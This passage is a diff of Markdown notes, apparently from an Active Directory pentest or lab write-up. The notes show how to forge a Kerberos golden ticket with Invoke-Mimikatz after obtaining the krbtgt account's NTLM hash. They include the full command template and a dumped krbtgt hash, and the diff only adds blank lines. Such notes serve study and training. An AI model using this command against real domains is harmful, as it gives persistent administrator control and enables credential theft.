@@ -8,10 +8,19 @@ Once we get the hash of krbtgt account, we can generate our own TGT using:
 ```Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<sid> /krbtgt:<krbtgt_hash> id:<id> /groups:<group_id_optional> /startoffset:0 /endin:600 /renewmax:10080 /ptt"'```
 
 > Found the following creds of krbtgt:
+
+
 > RID  : 000001f6 (502)
+
+
 > User : krbtgt
+
+
 > LM   :
+
+
 > NTLM : ff46a9d8bd66c6efd77603da26796f35
+
 
 To see currently stored tickets:
 ``` klist```
